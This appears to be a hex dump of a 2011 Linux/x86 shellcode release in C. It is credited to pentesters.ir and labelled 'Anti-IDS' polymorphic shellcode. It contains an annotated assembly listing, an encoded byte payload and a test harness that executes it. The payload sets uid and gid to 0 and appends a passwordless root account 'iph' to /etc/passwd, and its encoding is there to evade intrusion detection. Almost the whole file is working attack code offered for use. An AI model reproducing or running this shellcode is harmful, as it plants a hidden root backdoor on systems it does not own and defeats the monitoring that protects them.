00000000  2f 2a 0d 0a 23 20 45 78  70 6c 6f 69 74 20 54 69  |/*..# Exploit Ti|
00000010  74 6c 65 3a 20 4c 69 6e  75 78 2f 78 38 36 20 50  |tle: Linux/x86 P|
00000020  6f 6c 79 6d 6f 72 70 68  69 63 20 53 68 65 6c 6c  |olymorphic Shell|
00000030  43 6f 64 65 20 2d 20 73  65 74 75 69 64 28 30 29  |Code - setuid(0)|
00000040  2b 73 65 74 67 69 64 28  30 29 2b 61 64 64 20 75  |+setgid(0)+add u|
00000050  73 65 72 20 27 69 70 68  27 20 77 69 74 68 6f 75  |ser 'iph' withou|
00000060  74 20 70 61 73 73 77 6f  72 64 20 74 6f 20 2f 65  |t password to /e|
00000070  74 63 2f 70 61 73 73 77  64 0d 0a 23 20 73 65 74  |tc/passwd..# set|
00000080  75 69 64 28 29 20 2d 20  73 65 74 67 69 64 28 29  |uid() - setgid()|
00000090  20 2d 20 6f 70 65 6e 28  29 20 2d 20 77 72 69 74  | - open() - writ|
000000a0  65 28 29 20 2d 20 63 6c  6f 73 65 28 29 20 2d 20  |e() - close() - |
000000b0  65 78 69 74 28 29 0d 0a  23 20 44 61 74 65 3a 20  |exit()..# Date: |
000000c0  33 30 2f 31 32 2f 32 30  31 31 0d 0a 23 20 41 75  |30/12/2011..# Au|
000000d0  74 68 6f 72 3a 20 70 65  6e 74 65 73 74 65 72 73  |thor: pentesters|
000000e0  2e 69 72 0d 0a 23 20 54  65 73 74 65 64 20 6f 6e  |.ir..# Tested on|
000000f0  3a 20 4c 69 6e 75 78 20  78 38 36 20 2d 20 43 65  |: Linux x86 - Ce|
00000100  6e 74 4f 53 20 36 2e 30  20 2d 20 32 2e 36 2e 33  |ntOS 6.0 - 2.6.3|
00000110  32 2d 37 31 0d 0a 23 20  57 65 62 73 69 74 65 3a  |2-71..# Website:|
00000120  20 68 74 74 70 3a 2f 2f  70 65 6e 74 65 73 74 65  | http://penteste|
00000130  72 73 2e 69 72 2f 0d 0a  23 20 43 6f 6e 74 61 63  |rs.ir/..# Contac|
00000140  74 3a 20 43 72 75 33 6c  2e 62 30 79 40 67 6d 61  |t: Cru3l.b0y@gma|
00000150  69 6c 2e 63 6f 6d 0d 0a  23 20 42 79 3a 20 43 72  |il.com..# By: Cr|
00000160  75 33 6c 2e 62 30 79 0d  0a 23 20 69 70 68 3a 3a  |u3l.b0y..# iph::|
00000170  30 3a 30 3a 49 50 48 3a  2f 72 6f 6f 74 3a 2f 62  |0:0:IPH:/root:/b|
00000180  69 6e 2f 62 61 73 68 0d  0a 23 20 54 68 69 73 20  |in/bash..# This |
00000190  53 68 65 6c 6c 43 6f 64  65 20 69 73 20 41 6e 74  |ShellCode is Ant|
000001a0  69 2d 49 44 53 0d 0a 23  20 45 6e 63 6f 64 65 3a  |i-IDS..# Encode:|
000001b0  20 41 44 44 20 31 30 0d  0a 0d 0a 22 5c 78 62 30  | ADD 10...."\xb0|
000001c0  5c 78 31 37 22 20 20 20  20 20 20 20 20 20 20 20  |\x17"           |
000001d0  20 20 20 20 20 20 20 09  2f 2f 20 6d 6f 76 20 20  |       .// mov  |
000001e0  20 20 24 30 78 31 37 2c  25 61 6c 0d 0a 22 5c 78  |  $0x17,%al.."\x|
000001f0  33 31 5c 78 64 62 22 20  20 20 20 20 20 20 20 20  |31\xdb"         |
00000200  20 20 20 20 20 20 20 20  20 09 2f 2f 20 78 6f 72  |         .// xor|
00000210  20 20 20 20 25 65 62 78  2c 25 65 62 78 0d 0a 22  |    %ebx,%ebx.."|
00000220  5c 78 63 64 5c 78 38 30  22 20 20 20 20 20 20 20  |\xcd\x80"       |
00000230  20 20 20 20 20 20 20 20  20 20 20 09 2f 2f 20 69  |           .// i|
00000240  6e 74 20 20 20 20 24 30  78 38 30 0d 0a 22 5c 78  |nt    $0x80.."\x|
00000250  62 30 5c 78 32 65 22 20  20 20 20 20 20 20 20 20  |b0\x2e"         |
00000260  20 20 20 20 20 20 20 20  20 09 2f 2f 20 6d 6f 76  |         .// mov|
00000270  20 20 20 20 24 30 78 32  65 2c 25 61 6c 0d 0a 22  |    $0x2e,%al.."|
00000280  5c 78 35 33 22 20 20 20  20 20 20 20 20 20 20 20  |\x53"           |
00000290  20 20 20 20 20 20 20 20  20 20 20 09 2f 2f 20 70  |           .// p|
000002a0  75 73 68 20 20 20 25 65  62 78 0d 0a 22 5c 78 63  |ush   %ebx.."\xc|
000002b0  64 5c 78 38 30 22 20 20  20 20 20 20 20 20 20 20  |d\x80"          |
000002c0  20 20 20 20 20 20 20 20  09 2f 2f 20 69 6e 74 20  |        .// int |
000002d0  20 20 20 24 30 78 38 30  0d 0a 22 5c 78 36 61 5c  |   $0x80.."\x6a\|
000002e0  78 30 35 22 20 20 20 20  20 20 20 20 20 20 20 20  |x05"            |
000002f0  20 20 20 20 20 20 20 09  2f 2f 20 70 75 73 68 20  |       .// push |
00000300  20 20 24 30 78 35 0d 0a  22 5c 78 35 38 22 20 20  |  $0x5.."\x58"  |
00000310  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000320  20 09 2f 2f 20 70 6f 70  20 20 20 20 25 65 61 78  | .// pop    %eax|
00000330  0d 0a 22 5c 78 33 31 5c  78 63 39 22 20 20 20 20  |.."\x31\xc9"    |
00000340  20 20 20 20 20 20 20 20  20 20 20 20 09 2f 2f 20  |            .// |
00000350  78 6f 72 20 20 20 20 25  65 63 78 2c 25 65 63 78  |xor    %ecx,%ecx|
00000360  0d 0a 22 5c 78 35 31 22  20 20 20 20 20 20 20 20  |.."\x51"        |
00000370  20 20 20 20 20 20 20 20  20 20 20 09 2f 2f 20 70  |           .// p|
00000380  75 73 68 20 20 20 25 65  63 78 0d 0a 22 5c 78 36  |ush   %ecx.."\x6|
00000390  38 5c 78 37 33 5c 78 37  33 5c 78 37 37 5c 78 36  |8\x73\x73\x77\x6|
000003a0  34 22 20 20 20 20 20 20  20 09 2f 2f 20 70 75 73  |4"       .// pus|
000003b0  68 20 20 20 24 30 78 36  34 37 37 37 33 37 33 0d  |h   $0x64777373.|
000003c0  0a 22 5c 78 36 38 5c 78  32 66 5c 78 32 66 5c 78  |."\x68\x2f\x2f\x|
000003d0  37 30 5c 78 36 31 22 20  20 20 20 20 20 20 09 2f  |70\x61"       ./|
000003e0  2f 20 70 75 73 68 20 20  20 24 30 78 36 31 37 30  |/ push   $0x6170|
000003f0  32 66 32 66 0d 0a 22 5c  78 36 38 5c 78 32 66 5c  |2f2f.."\x68\x2f\|
00000400  78 36 35 5c 78 37 34 5c  78 36 33 22 20 20 20 20  |x65\x74\x63"    |
00000410  20 20 20 09 2f 2f 20 70  75 73 68 20 20 20 24 30  |   .// push   $0|
00000420  78 36 33 37 34 36 35 32  66 0d 0a 22 5c 78 38 39  |x6374652f.."\x89|
00000430  5c 78 65 33 22 20 20 20  20 20 20 20 20 20 20 20  |\xe3"           |
00000440  20 20 20 20 20 09 2f 2f  20 6d 6f 76 20 20 20 20  |     .// mov    |
00000450  25 65 73 70 2c 25 65 62  78 0d 0a 22 5c 78 36 36  |%esp,%ebx.."\x66|
00000460  5c 78 62 39 5c 78 30 31  5c 78 30 34 22 20 20 20  |\xb9\x01\x04"   |
00000470  20 20 20 20 20 20 20 09  2f 2f 20 6d 6f 76 20 20  |       .// mov  |
00000480  20 20 24 30 78 34 30 31  2c 25 63 78 0d 0a 22 5c  |  $0x401,%cx.."\|
00000490  78 63 64 5c 78 38 30 22  20 20 20 20 20 20 20 20  |xcd\x80"        |
000004a0  20 20 20 20 20 20 20 20  20 20 09 2f 2f 20 69 6e  |          .// in|
000004b0  74 20 20 20 20 24 30 78  38 30 0d 0a 22 5c 78 38  |t    $0x80.."\x8|
000004c0  39 5c 78 63 33 22 20 20  20 20 20 20 20 20 20 20  |9\xc3"          |
000004d0  20 20 20 20 20 20 20 20  09 2f 2f 20 6d 6f 76 20  |        .// mov |
000004e0  20 20 20 25 65 61 78 2c  25 65 62 78 0d 0a 22 5c  |   %eax,%ebx.."\|
000004f0  78 36 61 5c 78 30 34 22  20 20 20 20 20 20 20 20  |x6a\x04"        |
00000500  20 20 20 20 20 20 20 20  20 20 09 2f 2f 20 70 75  |          .// pu|
00000510  73 68 20 20 20 24 30 78  34 0d 0a 22 5c 78 35 38  |sh   $0x4.."\x58|
00000520  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
00000530  20 20 20 20 20 20 20 09  2f 2f 20 70 6f 70 20 20  |       .// pop  |
00000540  20 20 25 65 61 78 0d 0a  22 5c 78 33 31 5c 78 64  |  %eax.."\x31\xd|
00000550  32 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |2"              |
00000560  20 20 20 20 09 2f 2f 20  78 6f 72 20 20 20 20 25  |    .// xor    %|
00000570  65 64 78 2c 25 65 64 78  0d 0a 22 5c 78 35 32 22  |edx,%edx.."\x52"|
00000580  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000590  20 20 20 20 20 20 09 2f  2f 20 70 75 73 68 20 20  |      .// push  |
000005a0  20 25 65 64 78 0d 0a 22  5c 78 36 38 5c 78 36 32  | %edx.."\x68\x62|
000005b0  5c 78 36 31 5c 78 37 33  5c 78 36 38 22 20 20 20  |\x61\x73\x68"   |
000005c0  20 20 20 20 09 2f 2f 20  70 75 73 68 20 20 20 24  |    .// push   $|
000005d0  30 78 36 38 37 33 36 31  36 32 0d 0a 22 5c 78 36  |0x68736162.."\x6|
000005e0  38 5c 78 36 32 5c 78 36  39 5c 78 36 65 5c 78 32  |8\x62\x69\x6e\x2|
000005f0  66 22 20 20 20 20 20 20  20 09 2f 2f 20 70 75 73  |f"       .// pus|
00000600  68 20 20 20 24 30 78 32  66 36 65 36 39 36 32 0d  |h   $0x2f6e6962.|
00000610  0a 22 5c 78 36 38 5c 78  36 66 5c 78 37 34 5c 78  |."\x68\x6f\x74\x|
00000620  33 61 5c 78 32 66 22 20  20 20 20 20 20 20 09 2f  |3a\x2f"       ./|
00000630  2f 20 70 75 73 68 20 20  20 24 30 78 32 66 33 61  |/ push   $0x2f3a|
00000640  37 34 36 66 0d 0a 22 5c  78 36 38 5c 78 33 61 5c  |746f.."\x68\x3a\|
00000650  78 32 66 5c 78 37 32 5c  78 36 66 22 20 20 20 20  |x2f\x72\x6f"    |
00000660  20 20 20 09 2f 2f 20 70  75 73 68 20 20 20 24 30  |   .// push   $0|
00000670  78 36 66 37 32 32 66 33  61 0d 0a 22 5c 78 36 38  |x6f722f3a.."\x68|
00000680  5c 78 33 61 5c 78 34 39  5c 78 35 30 5c 78 34 38  |\x3a\x49\x50\x48|
00000690  22 20 20 20 20 20 20 20  09 2f 2f 20 70 75 73 68  |"       .// push|
000006a0  20 20 20 24 30 78 34 38  35 30 34 39 33 61 0d 0a  |   $0x4850493a..|
000006b0  22 5c 78 36 38 5c 78 33  61 5c 78 33 30 5c 78 33  |"\x68\x3a\x30\x3|
000006c0  61 5c 78 33 30 22 20 20  20 20 20 20 20 09 2f 2f  |a\x30"       .//|
000006d0  20 70 75 73 68 20 20 20  24 30 78 33 30 33 61 33  | push   $0x303a3|
000006e0  30 33 61 0d 0a 22 5c 78  36 38 5c 78 36 39 5c 78  |03a.."\x68\x69\x|
000006f0  37 30 5c 78 36 38 5c 78  33 61 22 20 20 20 20 20  |70\x68\x3a"     |
00000700  20 20 09 2f 2f 20 70 75  73 68 20 20 20 24 30 78  |  .// push   $0x|
00000710  33 61 36 38 37 30 36 39  0d 0a 22 5c 78 38 39 5c  |3a687069.."\x89\|
00000720  78 65 31 22 20 20 20 20  20 20 20 20 20 20 20 20  |xe1"            |
00000730  20 20 20 09 2f 2f 20 6d  6f 76 20 20 20 20 25 65  |   .// mov    %e|
00000740  73 70 2c 25 65 63 78 0d  0a 22 5c 78 36 61 5c 78  |sp,%ecx.."\x6a\x|
00000750  31 63 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |1c"             |
00000760  20 20 20 20 20 09 2f 2f  20 70 75 73 68 20 20 20  |     .// push   |
00000770  24 30 78 31 63 0d 0a 22  5c 78 35 61 22 20 20 20  |$0x1c.."\x5a"   |
00000780  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000790  20 20 20 09 2f 2f 20 70  6f 70 20 20 20 20 25 65  |   .// pop    %e|
000007a0  64 78 0d 0a 22 5c 78 63  64 5c 78 38 30 22 20 20  |dx.."\xcd\x80"  |
000007b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000007c0  09 2f 2f 20 69 6e 74 20  20 20 20 24 30 78 38 30  |.// int    $0x80|
000007d0  0d 0a 22 5c 78 36 61 5c  78 30 36 22 20 20 20 20  |.."\x6a\x06"    |
000007e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 09  |               .|
000007f0  2f 2f 20 70 75 73 68 20  20 20 24 30 78 36 0d 0a  |// push   $0x6..|
00000800  22 5c 78 35 38 22 20 20  20 20 20 20 20 20 20 20  |"\x58"          |
00000810  20 20 20 20 20 20 20 20  20 20 20 20 09 2f 2f 20  |            .// |
00000820  70 6f 70 20 20 20 20 25  65 61 78 0d 0a 22 5c 78  |pop    %eax.."\x|
00000830  63 64 5c 78 38 30 22 20  20 20 20 20 20 20 20 20  |cd\x80"         |
00000840  20 20 20 20 20 20 20 20  20 20 09 2f 2f 20 69 6e  |          .// in|
00000850  74 20 20 20 20 24 30 78  38 30 0d 0a 22 5c 78 36  |t    $0x80.."\x6|
00000860  61 5c 78 30 31 22 20 20  20 20 20 20 20 20 20 20  |a\x01"          |
00000870  20 20 20 20 20 20 20 20  09 2f 2f 20 70 75 73 68  |        .// push|
00000880  20 20 20 24 30 78 31 0d  0a 22 5c 78 35 38 22 20  |   $0x1.."\x58" |
00000890  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000008a0  20 20 20 20 20 09 2f 2f  20 70 6f 70 20 20 20 20  |     .// pop    |
000008b0  25 65 61 78 0d 0a 22 5c  78 63 64 5c 78 38 30 22  |%eax.."\xcd\x80"|
000008c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000008d0  09 2f 2f 20 69 6e 74 20  20 20 20 24 30 78 38 30  |.// int    $0x80|
000008e0  0d 0a 2a 2f 0d 0a 0d 0a  2f 2f 20 23 23 23 23 23  |..*/....// #####|
000008f0  20 41 4e 54 49 20 49 44  53 20 53 48 45 4c 4c 43  | ANTI IDS SHELLC|
00000900  4f 44 45 20 23 23 23 23  23 0d 0a 0d 0a 23 69 6e  |ODE #####....#in|
00000910  63 6c 75 64 65 20 3c 73  74 64 69 6f 2e 68 3e 0d  |clude <stdio.h>.|
00000920  0a 23 69 6e 63 6c 75 64  65 20 3c 73 74 64 6c 69  |.#include <stdli|
00000930  62 2e 68 3e 0d 0a 23 69  6e 63 6c 75 64 65 20 3c  |b.h>..#include <|
00000940  73 74 72 69 6e 67 2e 68  3e 0d 0a 0d 0a 63 68 61  |string.h>....cha|
00000950  72 20 73 63 5b 5d 20 3d  0d 0a 22 5c 78 65 62 5c  |r sc[] =.."\xeb\|
00000960  78 31 31 5c 78 35 65 5c  78 33 31 5c 78 63 39 5c  |x11\x5e\x31\xc9\|
00000970  78 62 31 5c 78 36 34 5c  78 38 30 5c 78 36 63 5c  |xb1\x64\x80\x6c\|
00000980  78 30 65 5c 78 66 66 5c  78 30 61 5c 78 38 30 5c  |x0e\xff\x0a\x80\|
00000990  78 65 39 22 0d 0a 22 5c  78 30 31 5c 78 37 35 5c  |xe9".."\x01\x75\|
000009a0  78 66 36 5c 78 65 62 5c  78 30 35 5c 78 65 38 5c  |xf6\xeb\x05\xe8\|
000009b0  78 65 61 5c 78 66 66 5c  78 66 66 5c 78 66 66 5c  |xea\xff\xff\xff\|
000009c0  78 62 61 5c 78 32 31 5c  78 33 62 5c 78 65 35 22  |xba\x21\x3b\xe5"|
000009d0  0d 0a 22 5c 78 64 37 5c  78 38 61 5c 78 62 61 5c  |.."\xd7\x8a\xba\|
000009e0  78 33 38 5c 78 35 64 5c  78 64 37 5c 78 38 61 5c  |x38\x5d\xd7\x8a\|
000009f0  78 37 34 5c 78 30 66 5c  78 36 32 5c 78 33 62 5c  |x74\x0f\x62\x3b\|
00000a00  78 64 33 5c 78 35 62 5c  78 37 32 22 0d 0a 22 5c  |xd3\x5b\x72".."\|
00000a10  78 37 64 5c 78 37 64 5c  78 38 31 5c 78 36 65 5c  |x7d\x7d\x81\x6e\|
00000a20  78 37 32 5c 78 33 39 5c  78 33 39 5c 78 37 61 5c  |x72\x39\x39\x7a\|
00000a30  78 36 62 5c 78 37 32 5c  78 33 39 5c 78 36 66 5c  |x6b\x72\x39\x6f\|
00000a40  78 37 65 5c 78 36 64 22  0d 0a 22 5c 78 39 33 5c  |x7e\x6d".."\x93\|
00000a50  78 65 64 5c 78 37 30 5c  78 63 33 5c 78 30 62 5c  |xed\x70\xc3\x0b\|
00000a60  78 30 65 5c 78 64 37 5c  78 38 61 5c 78 39 33 5c  |x0e\xd7\x8a\x93\|
00000a70  78 63 64 5c 78 37 34 5c  78 30 65 5c 78 36 32 5c  |xcd\x74\x0e\x62\|
00000a80  78 33 62 22 0d 0a 22 5c  78 64 63 5c 78 35 63 5c  |x3b".."\xdc\x5c\|
00000a90  78 37 32 5c 78 36 63 5c  78 36 62 5c 78 37 64 5c  |x72\x6c\x6b\x7d\|
00000aa0  78 37 32 5c 78 37 32 5c  78 36 63 5c 78 37 33 5c  |x72\x72\x6c\x73\|
00000ab0  78 37 38 5c 78 33 39 5c  78 37 32 5c 78 37 39 22  |x78\x39\x72\x79"|
00000ac0  0d 0a 22 5c 78 37 65 5c  78 34 34 5c 78 33 39 5c  |.."\x7e\x44\x39\|
00000ad0  78 37 32 5c 78 34 34 5c  78 33 39 5c 78 37 63 5c  |x72\x44\x39\x7c\|
00000ae0  78 37 39 5c 78 37 32 5c  78 34 34 5c 78 35 33 5c  |x79\x72\x44\x53\|
00000af0  78 35 61 5c 78 35 32 5c  78 37 32 22 0d 0a 22 5c  |x5a\x52\x72".."\|
00000b00  78 34 34 5c 78 33 61 5c  78 34 34 5c 78 33 61 5c  |x44\x3a\x44\x3a\|
00000b10  78 37 32 5c 78 37 33 5c  78 37 61 5c 78 37 32 5c  |x72\x73\x7a\x72\|
00000b20  78 34 34 5c 78 39 33 5c  78 65 62 5c 78 37 34 5c  |x44\x93\xeb\x74\|
00000b30  78 32 36 5c 78 36 34 22  0d 0a 22 5c 78 64 37 5c  |x26\x64".."\xd7\|
00000b40  78 38 61 5c 78 37 34 5c  78 31 30 5c 78 36 32 5c  |x8a\x74\x10\x62\|
00000b50  78 64 37 5c 78 38 61 5c  78 37 34 5c 78 30 62 5c  |xd7\x8a\x74\x0b\|
00000b60  78 36 32 5c 78 64 37 5c  78 38 61 22 3b 0d 0a 0d  |x62\xd7\x8a";...|
00000b70  0a 69 6e 74 20 6d 61 69  6e 28 29 0d 0a 7b 0d 0a  |.int main()..{..|
00000b80  09 69 6e 74 20 28 2a 66  70 29 28 29 20 3d 20 28  |.int (*fp)() = (|
00000b90  69 6e 74 28 2a 29 28 29  29 73 63 3b 0d 0a 20 20  |int(*)())sc;..  |
00000ba0  20 20 09 70 72 69 6e 74  66 28 22 62 79 74 65 73  |  .printf("bytes|
00000bb0  3a 20 25 75 5c 6e 22 2c  20 73 74 72 6c 65 6e 28  |: %u\n", strlen(|
00000bc0  73 63 29 29 3b 0d 0a 20  20 20 20 09 66 70 28 29  |sc));..    .fp()|
00000bd0  3b 0d 0a 7d                                       |;..}|
00000bd4
